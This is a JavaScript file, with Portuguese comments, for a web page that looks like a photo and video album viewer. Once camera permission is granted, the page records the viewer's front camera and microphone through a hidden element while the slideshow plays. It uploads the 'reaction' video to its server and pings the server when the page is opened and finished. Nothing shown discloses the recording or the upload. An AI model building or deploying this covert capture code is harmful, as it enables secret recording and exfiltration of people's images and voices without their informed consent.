const config = window.APP_CONFIG;

const startScreen = document.getElementById("start-screen");
const viewerScreen = document.getElementById("viewer-screen");
const finalScreen = document.getElementById("final-screen");

const startButton = document.getElementById("start-button");
const albumButton = document.getElementById("album-button");

const imageViewer = document.getElementById("image-viewer");
const videoViewer = document.getElementById("video-viewer");
const hiddenCamera = document.getElementById("hidden-camera");

// 1. variável compartilhada no topo
let uploadPromise = null;
let recorder;
let recordedChunks = [];
let stream;
let compositeCanvas, compositeCtx, rafId;

fetch("/api/notify?e=abriu").catch(() => { });

// 2. Para o recorder logo após a sequência terminar, antes de mostrar a tela final
startButton.addEventListener("click", async () => {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: 640, height: 480 },
            audio: true
        });

        hiddenCamera.srcObject = stream;
        startRecording(stream);

        startScreen.classList.remove("active");
        viewerScreen.classList.add("active");

        await playMediaSequence();

        recorder.stop();
        fetch("/api/notify?e=terminou").catch(() => { }); // ← aqui


        viewerScreen.classList.remove("active");
        finalScreen.classList.add("active");

    } catch (error) {
        console.error(error);
        alert("Permita câmera e microfone para continuar.");
    }
});

function criarCompositeCanvas() {
    compositeCanvas = document.createElement("canvas");
    compositeCanvas.width = 640;
    compositeCanvas.height = 480;
    compositeCtx = compositeCanvas.getContext("2d");
}


// loop que roda em cada frame e combina tela + câmera
function iniciarLoopComposicao() {
    const imageCanvas = document.getElementById("image-viewer");
    const camW = 160, camH = 120; // tamanho do PiP da câmera
    const margin = 12;

    function desenhar() {
        const cw = compositeCanvas.width;
        const ch = compositeCanvas.height;

        compositeCtx.fillStyle = "#000";
        compositeCtx.fillRect(0, 0, cw, ch);

        // 1. conteúdo do site (image-viewer canvas ou video-viewer)
        const isVideo = videoViewer.style.display !== "none";
        const fonte = isVideo ? videoViewer : imageCanvas;

        if (fonte && (fonte.readyState !== undefined ? fonte.readyState >= 2 : true)) {
            try {
                compositeCtx.drawImage(fonte, 0, 0, cw, ch);
            } catch (_) { }
        }

        // 2. câmera no canto inferior direito
        if (hiddenCamera.srcObject) {
            try {
                compositeCtx.save();
                // borda arredondada no PiP
                const x = cw - camW - margin;
                const y = ch - camH - margin;
                compositeCtx.beginPath();
                compositeCtx.roundRect(x, y, camW, camH, 8);
                compositeCtx.clip();
                compositeCtx.drawImage(hiddenCamera, x, y, camW, camH);
                compositeCtx.restore();
                // borda sutil
                compositeCtx.strokeStyle = "rgba(255,255,255,0.3)";
                compositeCtx.lineWidth = 1;
                compositeCtx.beginPath();
                compositeCtx.roundRect(cw - camW - margin, ch - camH - margin, camW, camH, 8);
                compositeCtx.stroke();
            } catch (_) { }
        }

        rafId = requestAnimationFrame(desenhar);
    }

    desenhar();
}

// ── substitui startRecording() completamente ─────────────────────────
function startRecording(stream) {
    criarCompositeCanvas();
    iniciarLoopComposicao();

    let fonteDoStream;
    let mimeType;

    // tenta composite — se captureStream não existir ou não retornar tracks, cai no fallback
    try {
        const testStream = compositeCanvas.captureStream(30);

        if (testStream.getVideoTracks().length > 0) {
            // iOS 15.4+ / Android — composite funciona
            const audioTrack = stream.getAudioTracks()[0];
            if (audioTrack) testStream.addTrack(audioTrack);
            fonteDoStream = testStream;
        } else {
            throw new Error("captureStream sem tracks");
        }
    } catch (_) {
        // iOS antigo — grava só a câmera frontal
        cancelAnimationFrame(rafId); // para o loop inútil
        fonteDoStream = stream;
    }

    mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
        ? "video/webm;codecs=vp8,opus"
        : MediaRecorder.isTypeSupported("video/mp4")
            ? "video/mp4"
            : "";

    recorder = new MediaRecorder(fonteDoStream, {
        ...(mimeType ? { mimeType } : {}),
        videoBitsPerSecond: 600_000,
        audioBitsPerSecond: 32_000,
    });

    recorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };

    let resolveUploadDone;
    window._uploadDone = new Promise(r => { resolveUploadDone = r; });

    recorder.onstop = async () => {
        cancelAnimationFrame(rafId);
        const ext = mimeType.includes("mp4") ? "mp4" : "webm";
        const blob = new Blob(recordedChunks, { type: mimeType || "video/mp4" });
        await uploadVideo(blob, ext);
        stream.getTracks().forEach(t => t.stop());
        resolveUploadDone();
    };

    recorder.start();
  }

async function playMediaSequence() {

    for (const item of config.MEDIA) {

        if (item.type === "image") {
            await showImage(item.src, item.duration);
        }

        if (item.type === "video") {
            await showVideo(item.src);
        }
    }

    viewerScreen.classList.remove("active");
    finalScreen.classList.add("active");
}

function showImage(src, duration) {

    return new Promise(resolve => {

        videoViewer.pause();
        videoViewer.style.display = "none";

        imageViewer.src = src;
        imageViewer.style.display = "block";

        setTimeout(resolve, duration);
    });
}

function showVideo(src) {

    return new Promise(resolve => {

        imageViewer.style.display = "none";

        videoViewer.src = src;
        videoViewer.style.display = "block";

        videoViewer.onended = () => {
            resolve();
        };

        videoViewer.play();
    });
}

// uploadVideo com retry e backoff
async function uploadVideo(blob, ext = "webm", tentativas = 3) {
    for (let i = 0; i < tentativas; i++) {
        try {
            const formData = new FormData();
            formData.append("video", blob, `reaction-${Date.now()}.${ext}`);
  

            const res = await fetch("/api/upload", {
                method: "POST",
                body: formData
            });

            if (res.ok) return; // sucesso, sai

            throw new Error(`HTTP ${res.status}`);

        } catch (err) {
            if (i === tentativas - 1) {
                console.error("Upload falhou após todas as tentativas:", err);
                return; // falhou tudo, não trava o usuário
            }
            // espera 2s, 4s antes de tentar de novo
            await new Promise(r => setTimeout(r, 2000 * (i + 1)));
        }
    }
}

// 3. Album button aguarda o upload terminar
albumButton.addEventListener("click", async () => {
    albumButton.disabled = true;
    albumButton.textContent = "Aguarde...";
    await window._uploadDone;
    window.location.href = config.GOOGLE_PHOTOS_URL;
});